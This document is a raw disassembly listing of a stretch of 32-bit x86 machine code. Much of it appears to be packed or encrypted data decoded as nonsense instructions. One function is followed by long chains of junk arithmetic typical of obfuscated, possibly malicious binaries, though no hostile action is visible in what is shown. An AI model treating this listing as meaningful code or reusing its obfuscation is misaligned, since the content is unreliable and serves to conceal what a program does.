  417399:	outs   dx,DWORD PTR ds:[esi]
  41739a:	sti    
  41739b:	sub    DWORD PTR [esp+ecx*2+0x60],esp
  41739f:	inc    ebx
  4173a0:	pop    ebp
  4173a1:	mov    ch,0xa4
  4173a3:	cmp    edi,edx
  4173a5:	aam    0x8a
  4173a7:	sub    al,0xfe
  4173a9:	out    dx,al
  4173aa:	int3   
  4173ab:	fld    QWORD PTR [esi+ebx*2]
  4173ae:	in     eax,dx
  4173af:	mov    bl,0x61
  4173b1:	push   cs
  4173b2:	push   es
  4173b3:	xor    esp,esp
  4173b5:	lods   al,BYTE PTR ds:[esi]
  4173b6:	gs xchg edi,eax
  4173b8:	pop    ss
  4173b9:	jnp    0x417437
  4173bb:	mov    cl,BYTE PTR [esi-0x77]
  4173be:	je     0x417396
  4173c0:	dec    ebx
  4173c1:	pop    bp
  4173c3:	push   esp
  4173c4:	cmp    ch,BYTE PTR [ebx]
  4173c6:	inc    ebx
  4173c7:	push   ds
  4173c8:	jecxz  0x417385
  4173ca:	ins    BYTE PTR es:[edi],dx
  4173cb:	cmp    DWORD PTR [edi-0x28353288],ebp
  4173d1:	jbe    0x417441
  4173d3:	pop    esp
  4173d4:	dec    edx
  4173d5:	pop    edx
  4173d6:	mov    WORD PTR [eax-0x44fe456f],?
  4173dc:	pusha  
  4173dd:	js     0x4173af
  4173df:	jmp    0xd908:0xacffdb43
  4173e6:	sub    edx,esi
  4173e8:	and    dh,bh
  4173ea:	xchg   dl,ah
  4173ec:	push   ss
  4173ed:	adc    al,BYTE PTR fs:[edi+0x614f7430]
  4173f4:	mov    ah,0x55
  4173f6:	(bad)  
  4173f7:	cmp    cl,BYTE PTR [esi+0x5e692a2a]
  4173fd:	inc    esi
  4173fe:	fcomi  st,st(6)
  417400:	xchg   esp,eax
  417401:	push   ss
  417402:	add    BYTE PTR [esi+ecx*2-0x76],ah
  417406:	loopne 0x4173ac
  417408:	jmp    0x417483
  41740a:	jecxz  0x417393
  41740c:	xchg   BYTE PTR [edx+0x12f40558],ah
  417412:	clc    
  417413:	fistp  QWORD PTR ds:0xc014cc77
  417419:	daa    
  41741a:	pop    ds
  41741b:	pushf  
  41741c:	mov    esi,0x33d14304
  417421:	sub    dh,BYTE PTR [ecx-0x43]
  417424:	fstp   TBYTE PTR [ebx+0x54]
  417427:	in     al,dx
  417428:	mov    ds:0xc308779f,eax
  41742d:	push   ds
  41742e:	add    dh,bl
  417430:	add    al,0xbc
  417432:	xor    al,dl
  417434:	mov    WORD PTR [esi],gs
  417436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417437:	rcl    BYTE PTR [ebx+0x641a596f],1
  41743d:	mov    cl,dh
  41743f:	pop    edx
  417440:	sbb    bh,bl
  417442:	outs   dx,DWORD PTR ds:[esi]
  417443:	jmp    0x8330:0xfa1f14e1
  41744a:	inc    ebx
  41744b:	(bad)  
  41744c:	mov    cl,0xda
  41744e:	fcomp  QWORD PTR [ecx+0x66b3e9c6]
  417454:	and    eax,0x6ca23706
  417459:	mov    ebp,0xddfe9bc7
  41745e:	dec    ebx
  41745f:	stos   DWORD PTR es:[edi],eax
  417460:	ss cld 
  417462:	push   eax
  417463:	add    al,0x99
  417465:	mov    BYTE PTR [esi+0x22a1a4de],bh
  41746b:	ror    BYTE PTR [edx-0x24],0x20
  41746f:	imul   ecx,DWORD PTR [ebx-0x33],0xffffff90
  417473:	jnp    0x4174c0
  417475:	test   ebx,ecx
  417477:	mov    al,0x3d
  417479:	mov    bl,0x20
  41747b:	xlat   BYTE PTR ds:[ebx]
  41747c:	cmp    ebp,ebx
  41747e:	mov    bl,0x74
  417480:	xor    eax,0x3ba7a9cc
  417485:	adc    BYTE PTR [esi],ch
  417487:	fs adc eax,0xc6342580
  41748d:	es jcxz 0x4174e6
  417491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417492:	outs   dx,DWORD PTR ds:[esi]
  417493:	or     esp,DWORD PTR [edi+0x5]
  417496:	jns    0x41750f
  417498:	xchg   ebx,eax
  417499:	dec    edi
  41749a:	repnz inc esp
  41749c:	adc    ecx,edi
  41749e:	mov    esp,0x9322e862
  4174a3:	ror    BYTE PTR [ecx+ebx*1+0x6499e439],cl
  4174aa:	inc    ecx
  4174ab:	ja     0x41745c
  4174ad:	pop    esi
  4174ae:	pop    ecx
  4174af:	fst    QWORD PTR [edx]
  4174b1:	std    
  4174b2:	in     al,dx
  4174b3:	aaa    
  4174b4:	fsubr  QWORD PTR [esi-0x171294fd]
  4174ba:	aad    0x46
  4174bc:	adc    al,0xa1
  4174be:	pop    edx
  4174bf:	xor    eax,ecx
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x422384
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428e20
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x422370
  417502:	call   DWORD PTR ds:0x428e44
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428e2c
  41750f:	mov    ecx,DWORD PTR ds:0x422738
  417515:	sub    DWORD PTR ds:0x4282bf,0x42833b
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [ecx+edi*8+0xaaa166c]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1-0x6fbfe7e8],bh
  41753e:	push   ss
  41753f:	sub    edx,ecx
  417541:	aad    0xde
  417543:	mov    cs:0x96af9c9a,al
  417549:	cmp    al,0xff
  41754b:	fst    DWORD PTR [ecx]
  41754d:	cli    
  41754e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41754f:	add    esi,esi
  417551:	jg     0x4174ea
  417553:	push   ds
  417554:	sti    
  417555:	xchg   edx,eax
  417556:	jecxz  0x417544
  417558:	mov    bh,0x35
  41755a:	outs   dx,BYTE PTR ds:[esi]
  41755b:	adc    eax,0xbfde8bd7
  417560:	ret    
  417561:	mov    al,BYTE PTR [esi]
  417563:	shl    DWORD PTR [esi-0x4d],0x8c
  417567:	imul   ecx,DWORD PTR [ebp-0x3bc93f2e],0x55
  41756e:	adc    bh,BYTE PTR [edi+0x968507b]
  417574:	jle    0x4174fe
  417576:	popa   
  417577:	ret    0xdade
  41757a:	lea    ebx,[esi]
  41757c:	fbstp  TBYTE PTR [edi]
  41757e:	fbstp  TBYTE PTR [edi-0x4b]
  417581:	fcmove st,st(5)
  417583:	aaa    
  417584:	and    BYTE PTR [ebp+0x1a8d1c70],dl
  41758a:	add    bh,al
  41758c:	push   eax
  41758d:	nop
  41758e:	ja     0x41752b
  417590:	fs loopne 0x417587
  417593:	add    DWORD PTR [ecx+0x7cbbe6a0],0xa347bab8
  41759d:	sub    bl,dl
  41759f:	int    0x3c
  4175a1:	imul   esi,DWORD PTR [ebp+0x2f],0xff73f479
  4175a8:	enter  0x8182,0x8b
  4175ac:	sub    al,0x97
  4175ae:	mov    esp,0xf5feafc9
  4175b3:	dec    edi
  4175b4:	mov    ah,0xe2
  4175b6:	xchg   edi,eax
  4175b7:	dec    edx
  4175b8:	dec    esp
  4175b9:	in     eax,dx
  4175ba:	arpl   WORD PTR [eax+0x3aad79b9],di
  4175c0:	push   ds
  4175c1:	mov    edx,0x7538565b
  4175c6:	fistp  QWORD PTR [edi+0x1a16e54c]
  4175cc:	cmp    dl,cl
  4175ce:	jns    0x41761f
  4175d0:	adc    bl,dh
  4175d2:	enter  0x34f1,0x65
  4175d6:	icebp  
  4175d7:	sti    
  4175d8:	pop    ebp
  4175d9:	xchg   ecx,eax
  4175da:	bound  ebx,QWORD PTR [edi]
  4175dc:	js     0x417607
  4175de:	inc    edi
  4175df:	push   ss
  4175e0:	dec    ecx
  4175e1:	push   eax
  4175e2:	adc    BYTE PTR [esi],dh
  4175e4:	cs fcmove st,st(4)
  4175e7:	daa    
  4175e8:	adc    DWORD PTR [ebp+ebp*1+0x545b3725],esi
  4175ef:	popa   
  4175f0:	and    eax,0xfecccd7a
  4175f5:	pop    es
  4175f6:	ins    BYTE PTR es:[edi],dx
  4175f7:	(bad)  
  4175f8:	fdiv   st(7),st
  4175fa:	jne    0x4175bf
  4175fc:	call   0x23c6dcc9
  417601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417602:	das    
  417603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417604:	or     BYTE PTR [ecx+esi*2+0x15],bl
  417608:	lock mov bl,0x48
  41760b:	inc    esp
  41760c:	scas   eax,DWORD PTR es:[edi]
  41760d:	jbe    0x417644
  41760f:	in     eax,0x9f
  417611:	ret    0x8460
  417614:	push   ss
  417615:	xor    BYTE PTR [ebp-0x206ecf4c],bh
  41761b:	inc    eax
  41761c:	jmp    0xdf09:0x6db8846
  417623:	jns    0x4175ab
  417625:	cmp    dl,BYTE PTR [ebp-0x222b5078]
  41762b:	dec    esi
  41762c:	inc    ecx
  41762d:	daa    
  41762e:	loope  0x4175de
  417630:	xchg   ebp,eax
  417631:	or     eax,0x1c022f52
  417636:	cs inc edx
  417638:	and    eax,0xbedd9e14
  41763d:	push   edi
  41763e:	frstor [ebx-0x4bf68373]
  417644:	or     DWORD PTR [edx+0x3e],0x58
  417648:	cmc    
  417649:	aaa    
  41764a:	test   DWORD PTR [eax+eiz*4+0x7b767388],ecx
  417651:	aad    0x8e
  417653:	aad    0x30
  417655:	cmp    al,0x0
  417657:	(bad)  
  417658:	test   BYTE PTR [edx],0x6
  41765b:	xchg   bl,al
  41765d:	cwde   
  41765e:	mov    bh,0x66
  417660:	lds    ecx,FWORD PTR [edi]
  417662:	add    eax,ebp
  417664:	mov    al,0xbf
  417666:	dec    edi
  417667:	mov    ds:0xc5bc7ffb,eax
  41766c:	rol    DWORD PTR [edx],1
  41766e:	mov    dl,0x4e
  417670:	adc    eax,0x60ead1e0
  417675:	cwde   
  417676:	pop    es
  417677:	rcl    DWORD PTR ds:0xa824acda,0x55
  41767e:	xchg   esi,eax
  41767f:	pmaxsw mm5,QWORD PTR [esi]
  417682:	popaw  
  417684:	push   ebp
  417685:	ret    0xcfb
  417688:	cmp    BYTE PTR [ebx+0x7],bl
  41768b:	inc    esp
  41768c:	in     eax,0xe
  41768e:	xchg   DWORD PTR [esi-0x42f0c495],eax
  417694:	mov    al,0x4c
  417696:	xchg   edi,eax
  417697:	inc    ebx
  417698:	test   al,0x70
  41769a:	mov    ds:0x834b9f19,al
  41769f:	sbb    al,0x1e
  4176a1:	mov    ah,0x48
  4176a3:	sub    al,BYTE PTR [eax+0x50b7dc4d]
  4176a9:	dec    eax
  4176aa:	lock inc ecx
  4176ac:	and    ch,BYTE PTR [ecx]
  4176ae:	fs dec eax
  4176b0:	pop    ebp
  4176b1:	leave  
  4176b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176b3:	add    BYTE PTR [eax],al
  4176b5:	(bad)  
  4176b6:	(bad)  
  4176b7:	int    0xcc
  4176b9:	cmp    DWORD PTR [edi],edi
  4176bb:	stc    
  4176bc:	add    BYTE PTR [ebp-0x29],cl
  4176bf:	test   al,0x29
  4176c1:	push   esp
  4176c2:	fadd   st(6),st
  4176c4:	pop    edx
  4176c5:	rol    DWORD PTR gs:[edi-0x4a],0xfe
  4176ca:	jecxz  0x417688
  4176cc:	sub    ah,BYTE PTR [eax+ecx*8]
  4176cf:	cld    
  4176d0:	sti    
  4176d1:	xchg   esp,eax
  4176d2:	fidiv  WORD PTR [bx+si]
  4176d5:	jge    0x417681
  4176d7:	push   0x1637e0dd
  4176dc:	or     edx,edi
  4176de:	jne    0x417694
  4176e0:	mov    bl,0x13
  4176e2:	popa   
  4176e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176e4:	adc    BYTE PTR [esi-0x31c1342],ah
  4176ea:	jmp    0x180ae3ae
  4176ef:	sbb    ebp,DWORD PTR [edi+0x5d]
  4176f2:	popf   
  4176f3:	ins    BYTE PTR es:[edi],dx
  4176f4:	popf   
  4176f5:	jecxz  0x417772
  4176f7:	jp     0x4176e3
  4176f9:	adc    DWORD PTR ds:0x8970a40c,esi
  4176ff:	jmp    0x22f3caea
  417704:	pop    DWORD PTR [edi-0x3]
  417707:	inc    edx
  417708:	ror    DWORD PTR [ebx+0x2150fc9],0xc4
  41770f:	paddsb mm3,mm1
  417712:	fsubr  DWORD PTR [edi-0x6a]
  417715:	add    al,0xf0
  417717:	nop
  417718:	(bad)  
  417719:	xchg   esi,eax
  41771a:	xchg   ebx,eax
  41771b:	pop    edi
  41771c:	sbb    DWORD PTR [ebp-0x20],edx
  41771f:	jg     0x4176d2
  417721:	in     eax,dx
  417722:	jae    0x417763
  417724:	dec    ecx
  417725:	iret   
  417726:	int    0x83
  417728:	mov    DWORD PTR [ebp+0x64fc3e94],ecx
  41772e:	lods   al,BYTE PTR ds:[esi]
  41772f:	adc    bh,BYTE PTR [esp+ecx*1-0x33710e2f]
  417736:	stos   DWORD PTR es:[edi],eax
  417737:	pop    ds
  417738:	shl    DWORD PTR [edi+0x5],cl
  41773b:	rcr    DWORD PTR [esi+0x319c0f38],1
  417741:	loop   0x4177a2
  417743:	(bad)  
  417745:	dec    edi
  417746:	mov    ebp,edx
  417748:	mov    edi,0x68e75993
  41774d:	pop    ds
  41774e:	stos   DWORD PTR es:[edi],eax
  41774f:	pop    ss
  417750:	scas   eax,DWORD PTR es:[edi]
  417751:	stos   BYTE PTR es:[edi],al
  417752:	lods   eax,DWORD PTR ss:[esi]
  417754:	sbb    DWORD PTR [esi-0x54e996ba],esp
  41775a:	mov    ds:0x4fbc7254,al
  41775f:	out    dx,al
  417760:	mov    al,0x25
  417762:	jle    0x41776d
  417764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417765:	mov    edx,0x5cbd91cf
  41776a:	sub    dl,BYTE PTR [esi+0x60cc3cf]
  417770:	das    
  417771:	xor    al,0x7e
  417773:	nop
  417774:	int    0x37
  417776:	(bad)  
  417777:	sbb    esp,eax
  417779:	mov    ah,0x3e
  41777b:	ret    0xec90
  41777e:	sub    eax,0x64d19144
  417783:	adc    BYTE PTR [ebp+0x50],dh
  417786:	jle    0x417805
  417788:	cmp    al,0x57
  41778a:	or     edi,ecx
  41778c:	adc    DWORD PTR [ecx-0x7eedd984],esi
  417792:	adc    eax,0x71330470
  417797:	mov    BYTE PTR [ecx-0x43],bl
  41779a:	xchg   esi,eax
  41779b:	mov    ecx,0x627b8339
  4177a0:	mov    ecx,0x9b64fb6e
  4177a5:	pushf  
  4177a6:	out    0x75,al
  4177a8:	push   ds
  4177a9:	xchg   DWORD PTR [ebx-0x4f],ebp
  4177ac:	jne    0x41778e
  4177ae:	push   eax
  4177af:	ret    
  4177b0:	mov    ecx,0x9ad0d4cf
  4177b5:	push   es
  4177b6:	lods   al,BYTE PTR ds:[esi]
  4177b7:	add    ecx,edx
  4177b9:	sub    DWORD PTR [ebx-0x7d],eax
  4177bc:	mov    ecx,DWORD PTR [esp+ebp*1]
  4177bf:	test   BYTE PTR [ecx+0x6],ah
  4177c2:	stos   BYTE PTR es:[edi],al
  4177c3:	cmp    al,0xa5
  4177c5:	ret    
  4177c6:	mov    bh,0x70
  4177c8:	jmp    0x417834
  4177ca:	rcl    BYTE PTR [ecx+0x1f093472],0x93
  4177d1:	dec    ecx
  4177d2:	cmp    ebp,DWORD PTR [ebp+0x50]
  4177d5:	mov    ebp,?
  4177d7:	add    ebp,ecx
  4177d9:	lock mov ebx,0xf52773f0
  4177df:	dec    ecx
  4177e0:	adc    BYTE PTR [ebx],dl
  4177e2:	xchg   esp,eax
  4177e3:	sub    esi,DWORD PTR [edi]
  4177e5:	icebp  
  4177e6:	or     ch,bh
  4177e8:	jge    0x417838
  4177ea:	test   BYTE PTR ds:0xfd550346,al
  4177f0:	mov    ebx,0x74c1e433
  4177f5:	stos   DWORD PTR es:[edi],eax
  4177f6:	rcr    al,cl
  4177f8:	stos   DWORD PTR es:[edi],eax
  4177f9:	pop    edx
  4177fa:	jmp    0x6a0a:0x52643a39
  417801:	mov    edx,0x1edac0d4
  417806:	xchg   ebp,eax
  417807:	xlat   BYTE PTR ds:[ebx]
  417808:	inc    eax
  417809:	sbb    ebp,esp
  41780b:	add    eax,0xa545ab0a
  417810:	and    dl,bh
  417812:	or     ebp,DWORD PTR [ebx+0x8bb0fda]
  417818:	test   al,0x6d
  41781a:	data16 fiadd WORD PTR [edx-0x73]
  41781e:	popf   
  41781f:	add    cl,BYTE PTR [ebp+0x58]
  417822:	mov    edx,0x8b690373
  417827:	mov    bh,0x1b
  417829:	mov    ch,0x8d
  41782b:	cmp    BYTE PTR [eax],cl
  41782d:	jo     0x4178a8
  41782f:	sti    
  417830:	stos   BYTE PTR es:[edi],al
  417831:	test   al,0xc2
  417833:	shl    DWORD PTR [esi+0x202c4b5],0xdc
  41783a:	fs push es
  41783c:	sbb    BYTE PTR [esi],al
  41783e:	dec    esp
  41783f:	in     eax,dx
  417840:	adc    eax,0x4077fada
  417845:	push   ds
  417846:	xor    eax,0x34f16897
  41784b:	mov    bh,0x7c
  41784d:	xchg   ebx,eax
  41784e:	(bad)  
  417850:	push   edi
  417851:	pop    ebx
  417852:	test   DWORD PTR [ebx],edi
  417854:	imul   edi,DWORD PTR [ebx-0x534e7796],0xffffffa8
  41785b:	sbb    dh,BYTE PTR [edi+esi*2-0x12]
  41785f:	sub    DWORD PTR [edx-0x32421a4d],esp
  417865:	fdivr  DWORD PTR [edx-0x2dcc18fa]
  41786b:	or     dl,ah
  41786d:	xchg   ecx,eax
  41786e:	adc    DWORD PTR [eax+0x4ab91aa5],ebx
  417874:	pop    eax
  417875:	lds    edi,FWORD PTR [edx-0x58c5edf1]
  41787b:	add    dh,bl
  41787d:	scas   al,BYTE PTR es:[edi]
  41787e:	or     al,0xe6
  417880:	jge    0x417861
  417882:	push   ebp
  417883:	pop    edx
  417884:	xor    DWORD PTR [ecx-0x1b],ebp
  417887:	aad    0xc9
  417889:	jns    0x4178b9
  41788b:	push   0xffffffa3
  41788d:	aam    0x4e
  41788f:	call   DWORD PTR [edi-0x5004baca]
  417895:	sbb    al,0x5c
  417897:	loope  0x417875
  417899:	ins    DWORD PTR es:[edi],dx
  41789a:	rol    BYTE PTR [esi],0x7b
  41789d:	fnstcw WORD PTR [eax+0x33]
  4178a0:	pop    edi
  4178a1:	xor    DWORD PTR [esi-0x63],ebp
  4178a4:	xlat   BYTE PTR ds:[ebx]
  4178a5:	pop    ss
  4178a6:	or     BYTE PTR ds:0xfbc721b9,ch
  4178ac:	cmp    eax,0xaf91f643
  4178b1:	inc    edi
  4178b2:	xor    ebx,DWORD PTR [eax-0x7196972d]
  4178b8:	push   ds
  4178b9:	pushf  
  4178ba:	push   ss
  4178bb:	jb     0x417919
  4178bd:	push   esi
  4178be:	xchg   edx,eax
  4178bf:	push   es
  4178c0:	lahf   
  4178c1:	lds    ebx,FWORD PTR [ecx-0x52]
  4178c4:	call   0x966f87fd
  4178c9:	in     eax,0xc
  4178cb:	aas    
  4178cc:	pusha  
  4178cd:	mov    eax,0xf79574b3
  4178d2:	test   dl,0xc4
  4178d5:	fbld   TBYTE PTR [ebp-0x33d77094]
  4178db:	cmp    dl,ah
  4178dd:	out    0x4c,al
  4178df:	push   ecx
  4178e0:	fadd   DWORD PTR [ecx+eiz*8+0x6693d005]
  4178e7:	leave  
  4178e8:	push   eax
  4178e9:	outs   dx,DWORD PTR ds:[esi]
  4178ea:	sbb    eax,esp
  4178ec:	xchg   edx,eax
  4178ed:	sub    ch,BYTE PTR [edx+0x0]
  4178f0:	and    DWORD PTR ds:0x428257,0x6fb6
  4178fa:	push   DWORD PTR [ecx]
  4178fc:	or     DWORD PTR ds:0x4281f7,0x652f
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42820f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x4281f7,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x428297
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x42825f,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42820f,0x428217
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x4282d3,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x42822f,0x42815b
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42811b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42821f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x42825b,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x428367
  4179bb:	add    DWORD PTR ds:0x42812b,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x428253,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428113,0x42832f
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x42812b,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428217
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x4282b7,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x428233,0x0
  417a53:	mov    DWORD PTR ds:0x4282af,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x428227,0x44f5
  417a72:	cmp    DWORD PTR ds:0x428233,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428da4
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428207,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x428293
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x42814b,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x42815b,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42811f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [eax+edi*4-0x51432cb7],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1-0x5ebee7e8],bh
  417b02:	add    esp,ecx
  417b04:	or     DWORD PTR [ecx+0x43],0xffffff84
  417b08:	push   esi
  417b09:	mov    DWORD PTR [ecx-0x5466b8fb],esp
  417b0f:	(bad)  
  417b10:	gs ins DWORD PTR es:[edi],dx
  417b12:	das    
  417b13:	in     al,dx
  417b14:	into   
  417b15:	sbb    BYTE PTR [edi+0x5dbf7947],cl
  417b1b:	push   eax
  417b1c:	jb     0x417b86
  417b1e:	xchg   DWORD PTR [esi],ebx
  417b20:	mov    esi,0xa7c77c41
  417b25:	clc    
  417b26:	sub    dh,ch
  417b28:	xor    eax,0xed8af346
  417b2d:	hlt    
  417b2e:	je     0x417ab5
  417b30:	stos   WORD PTR es:[edi],ax
  417b32:	aas    
  417b33:	out    0xf2,al
  417b35:	ret    
  417b36:	dec    esi
  417b37:	sub    DWORD PTR [ecx],0x47
  417b3a:	std    
  417b3b:	neg    DWORD PTR [ebp+0x15]
  417b3e:	jle    0x417b19
  417b40:	scas   al,BYTE PTR es:[edi]
  417b41:	ds retf 
  417b43:	call   0xcb7d:0x7a5a8652
  417b4a:	dec    esp
  417b4b:	popf   
  417b4c:	mov    bh,0xf7
  417b4e:	push   ebp
  417b4f:	inc    ecx
  417b50:	fwait
  417b51:	mov    al,ds:0x82e97e2
  417b56:	cmp    esp,DWORD PTR [ebx+0x2ed32a41]
  417b5c:	pop    edx
  417b5d:	test   eax,0xc2caf302
  417b62:	sub    BYTE PTR [ecx],bh
  417b64:	int3   
  417b65:	nop
  417b66:	bnd jb 0x417b90
  417b69:	mov    ds:0x95c9873,eax
  417b6e:	rcr    DWORD PTR [edi+0x19c8357b],0x1d
  417b75:	dec    eax
  417b76:	mov    edx,0x8a668e69
  417b7b:	add    esi,DWORD PTR [ebp+0x7cf2c63]
  417b81:	(bad)  
  417b82:	out    dx,eax
  417b83:	xor    BYTE PTR [edi-0x48],ch
  417b86:	mov    bh,0xa7
  417b88:	mov    ds:0x775fb670,eax
  417b8d:	ss jne 0x417bf8
  417b90:	ins    BYTE PTR es:[edi],dx
  417b91:	hlt    
  417b92:	std    
  417b93:	push   ebx
  417b94:	push   ebx
  417b95:	sbb    al,0xc6
  417b97:	in     al,0xf6
  417b99:	pop    ebx
  417b9a:	in     al,0xdf
  417b9c:	push   ss
  417b9d:	sti    
  417b9e:	dec    edi
  417b9f:	out    0xc5,al
  417ba1:	jge    0x417b9b
  417ba3:	ds das 
  417ba5:	xchg   BYTE PTR [eax+edi*4],al
  417ba8:	mov    ds:0x21f8f065,eax
  417bad:	fistp  DWORD PTR [ebx-0x53ac8d88]
  417bb3:	loop   0x417b9a
  417bb5:	mov    ds:0x95278adb,al
  417bba:	out    dx,al
  417bbb:	stos   DWORD PTR es:[edi],eax
  417bbc:	xchg   edi,eax
  417bbd:	cmc    
  417bbe:	jecxz  0x417b92
  417bc0:	aaa    
  417bc1:	cli    
  417bc2:	bound  edi,QWORD PTR [eax]
  417bc4:	ret    0x7afc
  417bc7:	dec    eax
  417bc8:	call   0xee6ad40f
  417bcd:	imul   edx,DWORD PTR [eax],0x863caaaf
  417bd3:	xor    eax,0xe1100f62
  417bd8:	pop    esi
  417bd9:	inc    eax
  417bda:	addr16 cmp bh,cl
  417bdd:	pop    ss
  417bde:	ret    
  417bdf:	bound  edx,QWORD PTR [edx-0x36bae119]
  417be5:	sahf   
  417be6:	and    al,0xf7
  417be8:	pop    ds
  417be9:	dec    edx
  417bea:	neg    bl
  417bec:	or     DWORD PTR [eax+0x7bf30b1a],eax
  417bf2:	clc    
  417bf3:	out    0xfb,al
  417bf5:	mov    dh,al
  417bf7:	cld    
  417bf8:	jmp    0x417be0
  417bfa:	loope  0x417bd1
  417bfc:	push   esi
  417bfd:	adc    BYTE PTR [esp+esi*1-0x6b],ah
  417c01:	aas    
  417c02:	mov    edi,0x17e81bd1
  417c07:	out    dx,al
  417c08:	xor    BYTE PTR [eax],cl
  417c0a:	fimul  WORD PTR [eax-0x999f75]
  417c10:	rcl    DWORD PTR [ecx+0x4a],cl
  417c13:	sbb    ebx,esp
  417c15:	aaa    
  417c16:	xchg   ebp,eax
  417c17:	out    dx,al
  417c18:	push   ss
  417c19:	sub    BYTE PTR [esi-0x2c902cc7],al
  417c1f:	pop    ebx
  417c20:	xlat   BYTE PTR ds:[ebx]
  417c21:	and    al,0x65
  417c23:	out    dx,al
  417c24:	not    esi
  417c26:	imul   dl
  417c28:	(bad)  
  417c29:	es call 0xc033ee4
  417c2f:	and    al,0x3d
  417c31:	out    dx,eax
  417c32:	fdiv   QWORD PTR [esp+eiz*8]
  417c35:	lea    eax,[eax+0x41ae40f8]
  417c3b:	jns    0x417c8f
  417c3d:	cwde   
  417c3e:	cmp    edi,eax
  417c40:	xor    BYTE PTR [esi],bl
  417c42:	fcom   QWORD PTR [ebx-0x377d6c20]
  417c48:	mov    dl,0x53
  417c4a:	or     eax,esi
  417c4c:	mov    eax,0x876efcbf
  417c51:	push   edx
